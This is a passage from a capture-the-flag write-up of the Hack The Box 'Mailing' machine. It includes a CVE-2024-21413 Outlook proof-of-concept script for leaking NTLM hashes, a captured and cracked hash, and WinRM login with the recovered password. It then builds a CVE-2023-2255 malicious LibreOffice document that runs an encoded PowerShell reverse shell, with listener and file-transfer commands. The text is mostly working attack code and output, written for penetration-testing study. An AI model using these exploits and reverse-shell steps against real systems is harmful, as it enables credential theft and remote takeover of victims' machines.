QqBoFxTDwpCD7ysztqukfTNE0DwUs13L93GiwRPTRN0fTjJtxThgBHU1CraYamRzSdrOmfmtZoirktaFU0Cm1vNMH0z3ofLAhI5T+ogkeKbhA2KYhlQJLuFbfcbZ7B6n32L2ZpdwwG7NB0GKZBHOdqGqqC5TnINLiIta1IEfDgdnwcMcsGSyhSXn6mGHtI972vaZem3QHHihkHpLumPvh/NZx5G05AMID+LcAB3K/pPU3/TmMPOmk6BX1SSuM4xv9XE/ujQENvzKsQ/dC89qCvVPvQgPE5cvFvlK1frkWQJvw+2xmMwucLNX3faKO81OSADEZBkW7G3xs1PRuAwegw/QSMorDBFJn6cgozcQhMy3OUV2XQjUnarZr+oulhTc8bG/5d3BMzJPUEHJA7NV2K/mJ4bko37GVjj0H7UAQCehjXDoExyZz6tabfBVg7YuqZCBQMZP1RXnAb5vINi9CI43xN12oarrxorulD12BemzUtUV4FBmfue5UXGazHGnDcrLwgVg5jsCjmzfv7oaZ9uB7Jdgaj518OM+90ZibehQ2yoQAba4LyaDsDjFuIyFS+0XYiGC1mOYxzNF3P7uGScxCIDtpKmLnERBTlupD9/sOafqqSUwbn4qDEQZryATBk1DJ2F2PscgQGvqbpHcvvidkpL/hRn7UdDJpvYbBiY006WvrpDCYgGg/rgnJcm4z9vwhCw4b4PIIgivVLUI/ZDNqYKhwIE30htfxwhUoM6RIzPi5EoWy2PmfeI5bfUtHXUmiu/IDPFROCKnys+5Scj6s17ieN+RIETjTg2BEw43ImtOIgbbHMh7lMHLOYzb2wJtN9mEvCGGj2YQHWPSPIdgaL4OBUCs7sZJ9DRe3Xsbb1MPMKMqxhf6a8yg8J+2CWvpXCjJI0xJU+QqcePs3DFiZR0E5kjm63XKcaywWGGRxftzkQYDwa9xLM6xWGeZonCCxqe0TwfePYjnnZtGdfCMJijFsYtomU7cjHAaV6wXFG+2iYBm8J9wwTDv2CEOY2zaJJKaw/D1piHzQOOffnKa9ANa8JwvN5+Ey1eN5SaI3bmKSP42n4GVW4pwD+z23wh0xcCC0zF3+XwFzlUbcvwWSsh6lbAu06Q2CwuN/GQRHZu5VXNH0EZu5H4GOOEZifinnvgKDsargGvEyK5v6MRRA9wMzHWqz/xv8yWPzrT2Hh3aVT0mbiiopFTb6nIT0tpiCtxzGHdaKFwa5h5to2I6iQKXTHAeDYAH9iG2vfgyAHMcDFKlhObTYOJT84A5Rcj0fpi88L7Tvg8y0TzM6bNP1c0wFNH1LJify16NcM1sTfLljErIhuYEaOF2Bx7BcE0ToEOD7Jrt2AQNObzN/iIG24yrJ+fDyKXK42+2x3JmLj3/Ue5qb1pbiVKvmVkc+o5MLOIjCYid8qL0ydSVwmmFLkt00VmEuxiN5TKnXRMh2a7wjtdZD4XVn7VkT0lM9hmyH4NKQtzjKEGWf8bsJYpkYwfdUyBGdMvAdm2W/powbz4vvTG9qam5+ShSMhT3AhItxFyFkwcn5DGAf9xlWzPhi8YuKSurQ7Wb7EfklFRknfRbxiQLWav+vEdEbbA0b5utHWDwf9Saa9TmaOeGUIS3ip0PaQRaOmgwU+Wk7ybxb6HOI4NkNQjWPtI8DQVNf3PvPLKPL4nPKitqnqQKWgDEVuq1PctxN7eBNrH4tgiQtyhGgimlikEstfSEhcbawTmU9T2D2vKnvxbrrIRbTNBDFDpmoV4/kuG3h+h3yyNQH7flVoiyfyqyzjlsLPIQYrhz8pYbBFEwfB60LbSWGfR1fsm4hNsOdNXG6YauT0f0xgykzjBJWYRI5r2OoM9d/oo41Iu3QRzMaDAfuWoopRo59vKa96RjK5Loa/RO/FfVYwvwqF5wgaPd0ltJ3iGKzlsUAl5l66woEmXMvs9G0qnAp4qWzqqErOZ4Wx95SczWnGWWmwPE8crykvT+b3ag5FJSkUP9dgziLBV2tUwcvLpJRLgWOwlgdJT/5C3VXKSypfleQKen5FphFRyeHpQhVyzgY4LvhmERW80r9TgN+QlUBpjtnKi/TZcKv6X9TwkEXzRZrxrNWOwVoeNYLjS5EwKisqZlL5FyHNoVbQBN1bwqRRXoHtQcF8C/qe3AChTSq2pagepQjoTfLPKS+cLoG+W9IT68EjlDkq+QVJG/oHNGcdg7UAHmXmGPlDl7H1WgVzJywmlzZ/Ugs8OwmOrUJ7WcDzJEU/1/ncQ5qJoqOUGpgnmHyUdD4N/98s3H9JwOcaK7S9FsLaxRyDpcY/lPfWsZ8ZsjjkOSwX2iiCWdoCwvNpoW1qAA1KTHiWwECvBJgThe+pGmSt8BwFhvnOQcUA56eY1wiBwSi9sroZa9QgCIMc7us5BrNLokofB3q7Cv/1/idUckEwmWqPQZsqi9P+aQRq8poxNvlIe1hbDwQeSnwO8YOCMHrU8FM/DvN7UAofkO9F3PeiMP47wprQ8w6z9EftVKWTKwiwjc30VQ8I/ucYznEO9kNGSd0hlms7Qx6ftCh9n+/brJ20yLNgNPrAShWk5lAwHh3iDSp4dE3CNuWVN32TtY/S9EeM/QYCFKdCg0xRyamFvczsy0OgiOZJCWIq8H0Tfh8l9amciadBdhhMRb+jOsj57DdngPkoxL8G8+8L5qJwfy/Bx71HNTttKqYIbgZf0ToNdAxmxxFosSGCRF3cQnOgV0rOVMnRS0I5qA5aI5cdoOaCXkQ8TzCtqJ7wVmONCnxMqFlM4zQamnYqiAIqlILoYumL8oxmDqsCQuRq9jti7pkgv3nR/t2hAn6ZNwWoOuR61kY5zDuxRnnORPTHYyo5okYSsqW+XUgH7zrllXDZ0FEwfzKR36mB9PcrYi7w8aemYf1MSLmoImgYqS8yw+cKphnVHv4qjXkdg4b5UYb25zkfRs1rlz5YLBbxS9h0FqSN3xqQGchfVahMYX5Jvk+h4LjzcqCuPgf9U8p7vSLI9+spqLBSJZZ8dREOepC9J9+JXiy9PeDYtfCxRsJf49inguUNyfSi98bGK/mt8sMwSamIN8i3JOuxJlSV4/fFsPyA+2n2e6NKrMhX7doH65jToKIRK4vRtykWMjNwb4pgB6n7pwyzJ1VBKkn8yaytSjhAk9jm7VX2ZC6Nez80Ah1ees+K6vK64x7SdFvge1HEbh07BMQgvdlz7Q+4pMehRYhhRiOYQS9h9oSgOYbno0O2WvnXLK5HH2fD9Ka3mvsY/WyEb0f+y6YAgagKBIOoxGo4668OPuKfsSarA/ily4Qgyusp7qE5U2piAnzUAUZgZkMkWnmg7VbT+8BWTd/wYgc1c/FYFcvv197N14hhcjWlZChTyDEOekMb6Ces/tId/4M9aXcmYjQaU+XnbM4G/zAG7XK8FZhLGWM3tJF+wuov3fEb26UPRss6vP9u5eDQFtD+GEzLjc6d69zOOjgGCw21bmMdHIM5ODgGc3BwcAzm4NAm8R8BBgAGrc+T79nGEQAAAABJRU5ErkJggg=="

    html = f"""\
    <html>
    <body>
        <h1><a href="file:///{link_url}!poc">Congratulations. You won an iPhone 15.</a></h1>
    </body>
    </html>
    """

    part1 = MIMEText(text, 'plain')
    part2 = MIMEText(html, 'html')
    msg.attach(part1)
    msg.attach(part2)

    try:
        with smtplib.SMTP(smtp_server, port) as server:
            server.ehlo()
            server.login(username, password)
            server.sendmail(sender_email, recipient_email, msg.as_string())
            print(f"{GREEN}✅ Email sent successfully.{ENDC}")
    except Exception as e:
        print(f"{RED}❌ Failed to send email: {e}{ENDC}")

def main():
    display_banner()
    parser = argparse.ArgumentParser(description="PoC for CVE-2024-21413 with SMTP authentication.")
    parser.add_argument('--server', required=True, help="SMTP server hostname or IP")
    parser.add_argument('--port', type=int, default=587, help="SMTP server port")
    parser.add_argument('--username', required=True, help="SMTP server username for authentication")
    parser.add_argument('--password', required=True, help="SMTP server password for authentication")
    parser.add_argument('--sender', required=True, help="Sender email address")
    parser.add_argument('--recipient', required=True, help="Recipient email address")
    parser.add_argument('--url', required=True, help="Malicious path to include in the email")
    parser.add_argument('--subject', required=True, help="Email subject")


    args = parser.parse_args()

    send_email(args.server, args.port, args.username, args.password, args.sender, args.recipient, args.url, args.subject)

if __name__ == "__main__":
    if len(sys.argv) == 1:
        display_banner()
        sys.exit(1)
    main()
```

Now I will run it again and it works:

```bash
❯ python3 CVE-2024-21413.py --server mailing.htb --port 25 --username 'Administrator@mailing.htb' --password homenetworkingadministrator --sender 'Administrator@mailing.htb' --recipient 'maya@mailing.htb' --url '\\10.10.14.106\test\test.txt' --subject 'Congratulations maya!'

CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
Alexander Hagenah / @xaitax / ah@primepage.de

✅ Email sent successfully.
```

And I also receive the ntlm hash of maya:

```bash
[*] Incoming connection (10.10.11.14,53224)
[*] AUTHENTICATE_MESSAGE (MAILING\maya,MAILING)
[*] User MAILING\maya authenticated successfully
[*] maya::MAILING:aaaaaaaaaaaaaaaa:47fcbe618358e75c741291cb185f4003:0101000000000000006b8f5de1fdda017a6cb09eb8345e9e0000000001001000700047005100480047007a006a00790003001000700047005100480047007a006a007900020010006a0075006600650055006c004a006600040010006a0075006600650055006c004a00660007000800006b8f5de1fdda0106000400020000000800300030000000000000000000000000200000f7b7ba203446d97ceda7a9efe47bfdfaeec949476bba07cb494c1f8e9a7811b00a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100300036000000000000000000
```

Now I will crack it and I have the password for maya:

```bash
❯ john -w=/usr/share/wordlists/rockyou.txt maya.hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
m4y4ngs4ri       (maya)     
1g 0:00:00:03 DONE (2024-09-03 12:02) 0.3267g/s 1938Kp/s 1938Kc/s 1938KC/s m61405..m4895621
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

This credential should work for smb and its the case:

```bash
❯ netexec smb 10.10.11.14 -u 'maya' -p 'm4y4ngs4ri'
SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.10.11.14     445    MAILING          [+] MAILING\maya:m4y4ngs4ri
```

And also for winrm, so I can access to Mailing machine:

```bash
❯ netexec winrm 10.10.11.14 -u 'maya' -p 'm4y4ngs4ri'
WINRM       10.10.11.14     5985   MAILING          [*] Windows 10 / Server 2019 Build 19041 (name:MAILING) (domain:MAILING)
WINRM       10.10.11.14     5985   MAILING          [+] MAILING\maya:m4y4ngs4ri (Pwn3d!)
```

```bash
❯ evil-winrm -i 10.10.11.14 -u 'maya' -p 'm4y4ngs4ri'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\maya\Documents> 
```

The user flag is available in maya's Desktop:

```bash
*Evil-WinRM* PS C:\Users\maya\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\maya\Desktop> dir


    Directory: C:\Users\maya\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/28/2024   7:34 PM           2350 Microsoft Edge.lnk
-ar---          9/3/2024  10:58 AM             34 user.txt


*Evil-WinRM* PS C:\Users\maya\Desktop> type user.txt
99****************************d6
```

# Access as localadmin

Looking at files, I can see in C: an empty folder called "Important Documents":

```powershell
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         4/10/2024   5:32 PM                Important Documents
d-----         2/28/2024   8:49 PM                inetpub
d-----         12/7/2019  10:14 AM                PerfLogs
d-----          3/9/2024   1:47 PM                PHP
d-r---         3/13/2024   4:49 PM                Program Files
d-r---         3/14/2024   3:24 PM                Program Files (x86)
d-r---          3/3/2024   4:19 PM                Users
d-----         4/29/2024   6:58 PM                Windows
d-----         4/12/2024   5:54 AM                wwwroot


*Evil-WinRM* PS C:\> dir "Important Documents"
```

What if some user of the machine open a document inside this folder? Looking for programs used to open documents I can see libreoffice:

```bash
*Evil-WinRM* PS C:\> dir "Program Files"


    Directory: C:\Program Files


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
<..SNIP>
d-----          3/4/2024   6:57 PM                LibreOffice
<..SNIP..>
```

Which has version 7.4.0.1:

```bash
*Evil-WinRM* PS C:\> cd "Program Files/LibreOffice"
*Evil-WinRM* PS C:\Program Files\LibreOffice> dir


    Directory: C:\Program Files\LibreOffice


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/4/2024   6:57 PM                help
d-----          3/4/2024   6:57 PM                presets
d-----         3/14/2024   4:01 PM                program
d-----          3/4/2024   6:57 PM                readmes
d-----          3/4/2024   6:57 PM                share
-a----         6/10/2022   4:14 PM        1807470 CREDITS.fodt
-a----          7/7/2022   1:05 PM         574491 LICENSE.html
-a----          7/7/2022   1:09 PM         503055 license.txt
-a----          7/6/2022  11:40 PM           3706 NOTICE


*Evil-WinRM* PS C:\Program Files\LibreOffice> cd program
*Evil-WinRM* PS C:\Program Files\LibreOffice\program> .\soffice.com --version
LibreOffice 7.4.0.1 43e5fcfbbadd18fccee5a6f42ddd533e40151bcf
```

Looking for vulnerabilities [here](https://www.libreoffice.org/about-us/security/advisories/) affecting this version, I saw [CVE-2023-2255](https://nvd.nist.gov/vuln/detail/CVE-2023-2255), which allows loading an external resource without consent:

![cve 2023 2255](/assets/images/Mailing/cve-2023-2255.png)

There is an exploit [here](https://github.com/elweth-sec/CVE-2023-2255) that allows crafting a malicious odt with command execution:

![libreoffice odt exploit](/assets/images/Mailing/libreoffice-odt-exploit.png)

I will clone it and generate an odt that gives me a reverse shell generated with [revshells.com](https://revshells.com):

![payload revshells.com](/assets/images/Mailing/payload-revshells.com.png)

```bash
❯ git clone https://github.com/elweth-sec/CVE-2023-2255
Cloning into 'CVE-2023-2255'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 10 (delta 2), reused 5 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (10/10), 8.47 KiB | 8.47 MiB/s, done.
Resolving deltas: 100% (2/2), done.
❯ cd CVE-2023-2255
❯ python3 CVE-2023-2255.py --cmd 'powershell -e <base64 encoded powershell>' --output important-document.odt
File important-document.odt has been created !
```

Now I will start a nc listener on the port I specified and transfer the document to the machine for in case somebody opens it, receive the shell:

**Attacker commands**:
```bash
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

**Victim command to transfer the file from my web server**:
```powershell
*Evil-WinRM* PS C:\Important Documents> curl.exe http://10.10.14.106/important-document.odt -o important-document.odt
```

And I receive shell as localadmin which belongs to the "Administradores" group (Administrators in spanish):

```powershell
connect to [10.10.14.106] from (UNKNOWN) [10.10.11.14] 58067

PS C:\Program Files\LibreOffice\program> whoami
mailing\localadmin
PS C:\Program Files\LibreOffice\program> net user localadmin
User name                    localadmin
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2024-02-27 9:38:45 PM
Password expires             Never
Password changeable          2024-02-27 9:38:45 PM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   2024-09-04 10:37:33 AM

Logon hours allowed          All

Local Group Memberships      *Administradores      
Global Group memberships     *Ninguno              
The command completed successfully.
```

And the root flag is available in localadmin's desktop:

```powershell
PS C:\Program Files\LibreOffice\program> cd C:\Users
PS C:\Users> dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----        2024-02-28   8:50 PM                .NET v2.0                                                            
d-----        2024-02-28   8:50 PM                .NET v2.0 Classic                                                    
d-----        2024-02-28   8:50 PM                .NET v4.5                                                            
d-----        2024-02-28   8:50 PM                .NET v4.5 Classic                                                    
d-----        2024-02-28   8:50 PM                Classic .NET AppPool                                                 
d-----        2024-03-09   1:52 PM                DefaultAppPool                                                       
d-----        2024-03-04   8:32 PM                localadmin                                                           
d-----        2024-02-28   7:34 PM                maya                                                                 
d-r---        2024-03-10   4:56 PM                Public                                                               


PS C:\Users> cd localadmin
PS C:\Users\localadmin> cd Desktop
PS C:\Users\localadmin\Desktop> type root.txt
83****************************32
```

That's the machine of today. Hope you liked it!
{% endraw %}